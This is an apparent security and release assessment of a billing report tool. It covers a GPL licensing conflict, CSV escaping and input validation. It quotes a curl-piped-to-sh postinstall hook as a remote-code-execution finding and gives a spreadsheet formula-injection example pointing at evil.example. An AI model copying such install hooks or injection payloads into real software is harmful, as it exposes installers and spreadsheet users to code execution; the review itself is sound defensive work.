# Billing report tool assessment

## Release recommendation

**Do not approve the next commercial release yet.** The current implementation
has two release blockers: an apparent third-party GPL component in a proprietary
product, and an install-time remote shell execution path. The report output also
cannot be treated as valid or safe CSV for general finance data.

## Scope and evidence

Reviewed `README.md`, `package.json`, `scripts/postinstall.sh`,
`src/report.js`, `vendor/quicksort-plus.js`, and `test/report.test.js`. No source
code was changed.

`npm test` passes: 1 test passed. That test checks only ascending output for two
simple rows.

## Findings

### Blocker — licensing and provenance conflict

`vendor/quicksort-plus.js` identifies itself as `quicksort-plus v0.4.1`, carries
a 2019 copyright notice, and is explicitly licensed under GPLv3 (or later).
`README.md`, however, says the helper was written in-house and that no
third-party code is bundled, while the package is marked proprietary and
`UNLICENSED`. Those claims are inconsistent with the vendored file. Shipping
GPL code in this proprietary distribution may impose source-distribution and
license-notice obligations and may be incompatible with the intended commercial
licensing model. There is no attribution or license text in the repository.

**Gate:** obtain a written provenance/license determination. Either remove and
replace the component with internally authored or commercially compatible code,
or complete the required GPL compliance review and update product disclosures
and notices before release.

### Blocker — arbitrary remote code execution during install

`postinstall` executes `curl -fsSL https://tables.example.com/latest/install.sh | sh`.
This gives a mutable remote endpoint code execution with the privileges of the
installer, without a pinned version, checksum, signature, lockfile, or reviewable
payload. A compromise or routine upstream change can alter every installation,
and offline/restricted builds can fail. The fetched tax tables are not referenced
by `src/report.js`, so the install side effect is currently disconnected from
report generation.

**Gate:** remove the shell-piped install hook, or replace it with a reviewed,
versioned, integrity-verified artifact and an explicit update process. Confirm
whether tax data is actually required and define its provenance and refresh
policy.

### High — output is not valid general-purpose CSV

`buildReport` interpolates `name` and `total` directly into comma-separated text.
It does not quote or escape commas, double quotes, CR/LF, or other CSV-sensitive
content. A name such as `Acme, Inc.` creates an extra column, a quoted name is
not escaped, and a newline splits one logical record into multiple records. The
tool therefore risks incorrect invoices, reconciliation failures, and data
corruption when opened by standard spreadsheet or CSV consumers.

**Gate:** define the CSV dialect and implement compliant field escaping for all
fields, including consistent line endings and a final-newline policy. Add tests
for commas, quotes, CR/LF, empty values, Unicode, and delimiter/header behavior.

### High — spreadsheet formula injection

User-controlled `name` values are emitted without neutralization. Values starting
with `=`, `+`, `-`, or `@` can be interpreted as formulas by spreadsheet software;
for example, `=HYPERLINK("https://evil.example")` is emitted as executable
spreadsheet content. This is a security issue if the finance team opens the CSV.

**Gate:** adopt an approved CSV export policy that neutralizes formula-like
values (after correct CSV quoting), document the behavior, and test the relevant
prefixes and leading whitespace cases.

### Medium — weak input validation and ordering semantics

The sort helper compares values with JavaScript relational operators. Numeric
strings therefore sort lexically rather than numerically, and missing totals can
be emitted literally as `undefined`. `buildReport` also assumes `rows` is an
array and that every row has usable `name` and `total` fields. These behaviors
can produce silently wrong financial ordering or malformed reports.

**Gate:** specify the accepted schema and numeric representation; validate and
reject invalid rows with actionable errors, normalize totals explicitly, and
define handling for ties, negative values, decimals, large values, and `NaN`.

### Medium — insufficient release coverage and reproducibility

There is only one happy-path test and no test for empty input, invalid input,
CSV correctness, injection safety, stable ties, numeric edge cases, or large
datasets. `package.json` has no dependency lockfile or build/release verification
script. The install hook also makes the result dependent on current network
state.

**Gate:** add contract, security, regression, and performance tests; run them in
CI on supported Node versions; produce a reproducible artifact; and document
the release procedure and supported input/output contract.

## Positive observations

The report function does not mutate the caller’s array because the helper sorts a
copy, and the existing basic ascending-order test passes. The package declares
ES modules and has no declared runtime dependency surface, although the
postinstall script introduces an undocumented external dependency in practice.

## Suggested acceptance checklist

- Legal/provenance review resolves the GPL/header versus README conflict.
- Installation performs no unreviewed remote code execution and works offline.
- Output is standards-compliant CSV and is safe for spreadsheet opening.
- Input schema, numeric ordering, errors, ties, and empty reports are specified
  and tested.
- CI verifies the complete test suite and a reproducible commercial artifact.

